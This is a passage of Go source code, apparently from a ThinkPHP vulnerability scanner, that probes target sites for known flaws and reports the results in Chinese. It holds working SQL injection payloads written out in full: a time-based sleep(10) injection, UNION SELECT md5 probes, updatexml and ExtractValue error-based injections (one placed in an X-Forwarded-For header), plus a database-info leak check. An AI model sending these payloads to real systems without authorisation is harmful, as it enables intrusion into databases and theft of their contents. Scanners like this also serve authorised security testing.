		"Content-type": "application/x-www-form-urlencoded",
	}).SetBodyString(thinkphp.Payload).SetContext(ctx).Post(fmt.Sprintf("%s%s", thinkphp.Url, path))
	if err != nil {
		thinkphp.Result <- fmt.Sprintf("[-]%s -> %s %s\n", "tp5_dbinfo_leak检测失败", thinkphp.Url, err.Error())
		return
	}

	if strings.Contains(resp.String(), "string(4) \"test\"") {
		thinkphp.Result <- fmt.Sprintf("[+]%s -> %s%s\n", "tp5_dbinfo_leak存在漏洞", thinkphp.Url, path)
		return
	} else {
		thinkphp.Result <- fmt.Sprintf("[-]%s -> %s\n", "tp5_dbinfo_leak不存在漏洞", thinkphp.Url)
		return
	}
}

func (thinkphp *ThinkPHP) tp_checkcode_time_sqli() {
	ctx, chanel := context.WithTimeout(context.Background(), time.Second*time.Duration(thinkphp.Timeout))
	defer chanel()
	path := "/index.php?s=/home/user/checkcode/"
	thinkphp.Payload = "/index.php?s=/home/user/checkcode/\", \"----------641902708\r\nContent-Disposition: form-data; name=\"couponid\"\r\n\r\n1')UniOn SelEct slEEp(10)#\r\n\r\n----------641902708--"

	OldTime := time.Now()
	_, err := req.SetHeaders(map[string]string{
		"User-Agent":   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
		"Content-Type": "multipart/form-data; boundary=--------641902708",
		"Accept":       "gzip, deflate, sdch",
	}).SetBodyString(thinkphp.Payload).SetContext(ctx).Post(fmt.Sprintf("%s%s", thinkphp.Url, path))
	if err != nil {
		thinkphp.Result <- fmt.Sprintf("[-]%s -> %s %s\n", "tp_checkcode_time_sqli检测失败", thinkphp.Url, err.Error())
		return
	}

	if time.Now().Sub(OldTime) >= time.Second*8 {
		thinkphp.Result <- fmt.Sprintf("[+]%s -> %s%s\n", "tp_checkcode_time_sqli存在漏洞", thinkphp.Url, path)
		return
	} else {
		thinkphp.Result <- fmt.Sprintf("[-]%s -> %s\n", "tp_checkcode_time_sqli不存在漏洞", thinkphp.Url)
		return
	}
}

func (thinkphp *ThinkPHP) tp_multi_sql_leak() {
	paths := []string{
		"/index.php?s=/home/shopcart/getPricetotal/tag/1%27",
		"/index.php?s=/home/shopcart/getpriceNum/id/1%27",
		"/index.php?s=/home/user/cut/id/1%27",
		"/index.php?s=/home/service/index/id/1%27",
		"/index.php?s=/home/pay/chongzhi/orderid/1%27",
		"/index.php?s=/home/order/complete/id/1%27",
		"/index.php?s=/home/order/detail/id/1%27",
		"/index.php?s=/home/order/cancel/id/1%27",
	}
	ctx, chanel := context.WithTimeout(context.Background(), time.Second*time.Duration(thinkphp.Timeout))
	defer chanel()

	for _, path := range paths {
		resp, err := req.SetHeaders(map[string]string{
			"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
		}).SetContext(ctx).Get(fmt.Sprintf("%s%s", thinkphp.Url, path))
		if err != nil {
			thinkphp.Result <- fmt.Sprintf("[-]%s -> %s %s\n", "tp_multi_sql_leak检测失败", thinkphp.Url, err.Error())
			continue
		}

		if strings.Contains(resp.String(), "SQL syntax") {
			thinkphp.Result <- fmt.Sprintf("[+]%s -> %s%s\n", "tp_multi_sql_leak存在漏洞", thinkphp.Url, path)
			continue
		} else {
			thinkphp.Result <- fmt.Sprintf("[-]%s -> %s\n", "tp_multi_sql_leak不存在漏洞", thinkphp.Url)
			continue
		}
	}
}

func (thinkphp *ThinkPHP) tp_pay_orderid_sqli() {
	path := "/index.php?s=/home/pay/index/orderid/1%27)UnIoN/**/All/**/SeLeCT/**/Md5(2333)--+"
	ctx, chanel := context.WithTimeout(context.Background(), time.Second*time.Duration(thinkphp.Timeout))
	defer chanel()
	resp, err := req.SetHeaders(map[string]string{
		"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
	}).SetContext(ctx).Get(fmt.Sprintf("%s%s", thinkphp.Url, path))
	if err != nil {
		thinkphp.Result <- fmt.Sprintf("[-]%s -> %s %s\n", "tp_pay_orderid_sqli检测失败", thinkphp.Url, err.Error())
		return
	}

	if strings.Contains(resp.String(), "56540676a129760a") {
		thinkphp.Result <- fmt.Sprintf("[+]%s -> %s%s\n", "tp_pay_orderid_sqli存在漏洞", thinkphp.Url, path)
		return
	} else {
		thinkphp.Result <- fmt.Sprintf("[-]%s -> %s\n", "tp_pay_orderid_sqli不存在漏洞", thinkphp.Url)
		return
	}
}

func (thinkphp *ThinkPHP) tp_update_sql() {
	path := "/index.php?money[]=1123&user=liao&id[0]=bind&id[1]=0%20and%20(updatexml(1,concat(0x7e,(select%20md5(520)),0x7e),1))"
	ctx, chanel := context.WithTimeout(context.Background(), time.Second*time.Duration(thinkphp.Timeout))
	defer chanel()
	resp, err := req.SetHeaders(map[string]string{
		"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
	}).SetContext(ctx).Get(fmt.Sprintf("%s%s", thinkphp.Url, path))
	if err != nil {
		thinkphp.Result <- fmt.Sprintf("[-]%s -> %s %s\n", "tp_update_sql检测失败", thinkphp.Url, err.Error())
		return
	}

	if strings.Contains(resp.String(), "cf67355a3333e6e143439161adc2d82") {
		thinkphp.Result <- fmt.Sprintf("[+]%s -> %s%s\n", "tp_update_sql存在漏洞", thinkphp.Url, path)
		return
	} else {
		thinkphp.Result <- fmt.Sprintf("[-]%s -> %s\n", "tp_update_sql不存在漏洞", thinkphp.Url)
		return
	}
}

func (thinkphp *ThinkPHP) tp_view_recent_xff_sqli() {
	path := "/index.php?s=/home/article/view_recent/name/1"
	ctx, chanel := context.WithTimeout(context.Background(), time.Second*time.Duration(thinkphp.Timeout))
	defer chanel()
	resp, err := req.SetHeaders(map[string]string{
		"User-Agent":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
		"X-Forwarded-For": "1')And/**/ExtractValue(1,ConCat(0x5c,(sElEct/**/Md5(2333))))#",
	}).SetContext(ctx).Get(fmt.Sprintf("%s%s", thinkphp.Url, path))
	if err != nil {
		thinkphp.Result <- fmt.Sprintf("[-]%s -> %s %s\n", "tp_view_recent_xff_sqli检测失败", thinkphp.Url, err.Error())
		return
	}

	if strings.Contains(resp.String(), "56540676a129760a") {
		thinkphp.Result <- fmt.Sprintf("[+]%s -> %s%s\n", "tp_view_recent_xff_sqli存在漏洞", thinkphp.Url, path)
		return
	} else {
		thinkphp.Result <- fmt.Sprintf("[-]%s -> %s\n", "tp_view_recent_xff_sqli不存在漏洞", thinkphp.Url)
		return
	}
}
